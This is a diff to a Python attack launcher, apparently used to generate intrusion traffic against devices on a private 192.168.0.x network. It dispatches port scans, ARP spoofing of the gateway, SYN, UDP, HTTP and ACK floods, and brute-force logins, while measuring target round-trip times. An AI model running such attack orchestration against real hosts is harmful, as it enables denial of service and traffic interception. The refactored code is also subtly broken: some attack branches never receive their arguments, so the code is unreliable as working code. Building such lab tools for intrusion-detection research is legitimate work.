@@ -54,70 +54,54 @@ IP_DICT = {1:"192.168.0.101",
            11:"192.168.0.161",
            12:"192.168.0.162",
            13:"192.168.0.191",}
+ATK_DICT={1:host_discovery,
+          2:port_scanning,
+          3:os_and_service_detection,
+          4:arp_spoofing,
+          5:syn_flood,
+          6:scan_brute_force,
+          7:udp_flood,
+          8:http_flood,
+          9:ack_flood}
 
 def launch_attack(selection, target_ip, intensity=None, pps=None, time=None):
-    if selection in [1, 2, 3]:
-        if not intensity:
-            intensity = random.randrange(2, 5) ######### need to change
-        if selection == 1:
-            host_discovery('192.168.0.0/24', intensity)  # scan WiFi network
-        elif selection == 2:
-            port_scanning(target_ip, intensity)  
-        elif selection == 3:
-            os_and_service_detection(target_ip, intensity)
-    elif selection == 4:
-        runtime = random.randrange(10, 61)
-        arp_spoofing(target_ip, '192.168.0.1', runtime=runtime)  # cheat MAC addr of Wi-Fi router
-    elif selection == 5:  ##### need to add open ports first
-        # pps = random.randrange(100, 501)    # 초당 전송할 패킷 개수
-        # time = random.randrange(5, 31)      # 공격 유지 시간
-        # pps=14000
-        # time=30
-        count = pps * time                  # 총 공격 패킷 수
-        if target_ip in open_ports.keys():
-            port = random.choice(open_ports[target_ip])  # 기기별 열린 포트 중 하나 선택
-        else:
-            port = random.randrange(1, 65536)   # 열린 포트 정보가 없다면 랜덤 지정
-        
-        t1 = ThreadWithReturnValue(target=calc_flooding_intensity, args=(time,target_ip))
-        t2 = threading.Thread(target=syn_flood, args=(target_ip, port, pps, count))
-        t1.start()
-        # starting thread 2
-        t2.start()
+    if not intensity:
+        intensity = random.randrange(2, 5) ######### need to change
+
+    attack=ATK_DICT[selection]
     
-        # wait until thread 1 is completely executed
-        rtt=t1.join()
-        # wait until thread 2 is completely executed
-        t2.join()
-        plt.plot(rtt)
-        plt.savefig("pings.png")
+    if selection ==1:
+        args=('192.168.0.0/24', intensity)
+    elif selection in [2,3]:
+        args=(target_ip, intensity)
+
+    elif selection ==4:
+        runtime = random.randrange(10, 61)
+        args=(target_ip, '192.168.0.1', runtime)
+    elif selection in [5,7,8,9]:
+        count = pps * time 
+        if selection == 5:
+            if target_ip in open_ports.keys():
+                port = random.choice(open_ports[target_ip])  # 기기별 열린 포트 중 하나 선택
+            else:
+                port = random.randrange(1, 65536)   # 열린 포트 정보가 없다면 랜덤 지정
+        elif selection ==7:
+            port = random.randrange(1, 2)
+
+        args=(target_ip, port, pps, count)
         
+    t1 = ThreadWithReturnValue(target=calc_flooding_intensity, args=(time,target_ip))
+    t2 = threading.Thread(target=attack, args=args)
+    t1.start()
+    # starting thread 2
+    t2.start()
 
-    elif selection == 6:
-        # target_ip = '192.168.10.23'     # some telnet server
-        interval = round(random.uniform(0, 0.2), 3)   # bruteforce 시 로그인 시도 간격
-        scan_brute_force(target_ip, time_interval=interval)
-
-    elif selection == 7:
-        # target_ip = '192.168.10.23'         # some web server
-        # pps = random.randrange(100, 1001)   # 초당 전송할 패킷 개수
-        # time = random.randrange(10, 31)     # 공격 유지 시간
-        count = pps * time                  # 총 공격 패킷 수
-        byte = random.randrange(50, 201)    # 데이터 크기
-        port_type = random.randrange(1, 2)  # udp flood는 타입이 2가지 - 1) 타겟 포트 고정, 2) 타겟 포트 랜덤
-        udp_flood(target_ip, port_type, pps, count, byte)
-
-    elif selection in [8, 9]:
-        # target_ip = '192.168.10.23'         # some web server
-        # pps = random.randrange(100, 501)    # 초당 전송할 패킷 개수
-        # time = random.randrange(10, 31)     # 공격 유지 시간
-        count = pps * time                  # 총 공격 패킷 수
-        port = 80
-        if selection == 8:
-            http_flood(target_ip, port, pps, count)
-        elif selection == 9:
-            ack_flood(target_ip, port, pps, count)
-
+    # wait until thread 1 is completely executed
+    rtt=t1.join()
+    # wait until thread 2 is completely executed
+    t2.join()
+    plt.plot(rtt)
+    plt.savefig("pings.png")
 
 def check_ip_format(ip):
     correct_ip = True
